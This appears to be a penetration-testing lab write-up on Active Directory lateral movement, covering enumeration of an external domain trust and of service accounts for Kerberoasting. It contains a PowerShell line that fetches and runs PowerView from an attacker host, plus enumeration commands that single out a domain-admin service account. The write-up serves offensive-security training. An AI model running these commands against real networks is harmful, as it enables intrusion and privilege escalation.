# Lateral Movement 2

- [Lateral Movement 2](#lateral-movement-2)
  - [External Trust Enumeration](#external-trust-enumeration)
  - [Kerberoasting](#kerberoasting)

---

## External Trust Enumeration

To enumerate, first import `PowerView_dev.ps1`:

```
iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/PowerView_dev.ps1"))
```

<br/>

Then map Domain Trust:

```
Get-NetDomainTrust
```

![picture 29](images/8db1c3a16c4a0616f3e8265ea2fa46b39b5899f1d0bb9fb41899818f3fd71f4b.png)  

As shown, the current domain has a 2-way transitive external trust with the domain `nuclear.site`, which means we can abuse this to access `nuclear.site`.

<br/>

## Kerberoasting

To enumerate users with SPN set in the domain `nuclear.site`:

```
Get-NetUser -SPN -Domain nuclear.site
```

![picture 30](images/d2df022443d492d64e6195c2189609e0d190248628a5f5ad6210168e39261194.png)  

As shown, the user `iis_svc`, a domain admin, has a SPN `HTTP/nuclear-dc.nuclear.site`.

<br/>